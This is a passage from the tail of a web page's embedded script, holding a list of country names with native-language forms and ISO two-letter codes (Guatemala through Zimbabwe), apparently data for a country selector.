,["Guatemala","GT"]
,["Guernsey","GG"]
,["Guinea (Guinée)","GN"]
,["Guinea-Bissau (Guiné-Bissau)","GW"]
,["Guyana","GY"]
,["Haiti","HT"]
,["Honduras","HN"]
,["Hong Kong (香港)","HK"]
,["Hungary (Magyarország)","HU"]
,["Iceland (Ísland)","IS"]
,["India (भारत)","IN"]
,["Indonesia","ID"]
,["Iran (\u202bایران\u202c\u200e)","IR"]
,["Iraq (\u202bالعراق\u202c\u200e)","IQ"]
,["Ireland","IE"]
,["Isle of Man","IM"]
,["Israel (\u202bישראל\u202c\u200e)","IL"]
,["Italy (Italia)","IT"]
,["Jamaica","JM"]
,["Japan (日本)","JP"]
,["Jersey","JE"]
,["Jordan (\u202bالأردن\u202c\u200e)","JO"]
,["Kazakhstan (Казахстан)","KZ"]
,["Kenya","KE"]
,["Kiribati","KI"]
,["Kuwait (\u202bالكويت\u202c\u200e)","KW"]
,["Kyrgyzstan (Кыргызстан)","KG"]
,["Laos (ລາວ)","LA"]
,["Latvia (Latvija)","LV"]
,["Lebanon (\u202bلبنان\u202c\u200e)","LB"]
,["Lesotho","LS"]
,["Liberia","LR"]
,["Libya (\u202bليبيا\u202c\u200e)","LY"]
,["Liechtenstein","LI"]
,["Lithuania (Lietuva)","LT"]
,["Luxembourg","LU"]
,["Macau (澳門)","MO"]
,["Macedonia (FYROM) (Македонија)","MK"]
,["Madagascar (Madagasikara)","MG"]
,["Malawi","MW"]
,["Malaysia","MY"]
,["Maldives","MV"]
,["Mali","ML"]
,["Malta","MT"]
,["Marshall Islands","MH"]
,["Martinique","MQ"]
,["Mauritania (\u202bموريتانيا\u202c\u200e)","MR"]
,["Mauritius (Moris)","MU"]
,["Mayotte","YT"]
,["Mexico (México)","MX"]
,["Micronesia","FM"]
,["Moldova (Republica Moldova)","MD"]
,["Monaco","MC"]
,["Mongolia (Монгол)","MN"]
,["Montenegro (Crna Gora)","ME"]
,["Montserrat","MS"]
,["Morocco","MA"]
,["Mozambique (Moçambique)","MZ"]
,["Myanmar (Burma) (မြန်မာ)","MM"]
,["Namibia (Namibië)","NA"]
,["Nauru","NR"]
,["Nepal (नेपाल)","NP"]
,["Netherlands (Nederland)","NL"]
,["New Caledonia (Nouvelle-Calédonie)","NC"]
,["New Zealand","NZ"]
,["Nicaragua","NI"]
,["Niger (Nijar)","NE"]
,["Nigeria","NG"]
,["Niue","NU"]
,["Norfolk Island","NF"]
,["Northern Mariana Islands","MP"]
,["North Korea (조선민주주의인민공화국)","KP"]
,["Norway (Norge)","NO"]
,["Oman (\u202bعُمان\u202c\u200e)","OM"]
,["Pakistan (\u202bپاکستان\u202c\u200e)","PK"]
,["Palau","PW"]
,["Palestine (\u202bفلسطين\u202c\u200e)","PS"]
,["Panama (Panamá)","PA"]
,["Papua New Guinea","PG"]
,["Paraguay","PY"]
,["Peru (Perú)","PE"]
,["Philippines","PH"]
,["Poland (Polska)","PL"]
,["Portugal","PT"]
,["Puerto Rico","PR"]
,["Qatar (\u202bقطر\u202c\u200e)","QA"]
,["Réunion (La Réunion)","RE"]
,["Romania (România)","RO"]
,["Russia (Россия)","RU"]
,["Rwanda","RW"]
,["Samoa","WS"]
,["San Marino","SM"]
,["São Tomé \u0026 Príncipe (São Tomé e Príncipe)","ST"]
,["Saudi Arabia (\u202bالمملكة العربية السعودية\u202c\u200e)","SA"]
,["Senegal","SN"]
,["Serbia (Србија)","RS"]
,["Seychelles","SC"]
,["Sierra Leone","SL"]
,["Singapore","SG"]
,["Sint Maarten","SX"]
,["Slovakia (Slovensko)","SK"]
,["Slovenia (Slovenija)","SI"]
,["Solomon Islands","SB"]
,["Somalia (Soomaaliya)","SO"]
,["South Africa","ZA"]
,["South Korea (대한민국)","KR"]
,["South Sudan (\u202bجنوب السودان\u202c\u200e)","SS"]
,["Spain (España)","ES"]
,["Sri Lanka (ශ්\u200dරී ලංකාව)","LK"]
,["St. Helena","SH"]
,["St. Kitts \u0026 Nevis","KN"]
,["St. Lucia","LC"]
,["St. Martin (Saint-Martin)","MF"]
,["St. Pierre \u0026 Miquelon (Saint-Pierre-et-Miquelon)","PM"]
,["St. Vincent \u0026 Grenadines","VC"]
,["Sudan (\u202bالسودان\u202c\u200e)","SD"]
,["Suriname","SR"]
,["Svalbard \u0026 Jan Mayen (Svalbard og Jan Mayen)","SJ"]
,["Swaziland","SZ"]
,["Sweden (Sverige)","SE"]
,["Switzerland (Schweiz)","CH"]
,["Syria (\u202bسوريا\u202c\u200e)","SY"]
,["Taiwan (台灣)","TW"]
,["Tajikistan","TJ"]
,["Tanzania","TZ"]
,["Thailand (ไทย)","TH"]
,["Timor-Leste","TL"]
,["Togo","TG"]
,["Tokelau","TK"]
,["Tonga","TO"]
,["Trinidad \u0026 Tobago","TT"]
,["Tunisia","TN"]
,["Turkey (Türkiye)","TR"]
,["Turkmenistan","TM"]
,["Turks \u0026 Caicos Islands","TC"]
,["Tuvalu","TV"]
,["U.S. Virgin Islands","VI"]
,["Uganda","UG"]
,["Ukraine (Україна)","UA"]
,["United Arab Emirates (\u202bالإمارات العربية المتحدة\u202c\u200e)","AE"]
,["United Kingdom","GB"]
,["United States","US"]
,["Uruguay","UY"]
,["Uzbekistan (Oʻzbekiston)","UZ"]
,["Vanuatu","VU"]
,["Vatican City (Città del Vaticano)","VA"]
,["Venezuela","VE"]
,["Vietnam (Việt Nam)","VN"]
,["Wallis \u0026 Futuna","WF"]
,["Yemen (\u202bاليمن\u202c\u200e)","YE"]
,["Zambia","ZM"]
,["Zimbabwe","ZW"]
]
]
]
}});</script></body></html>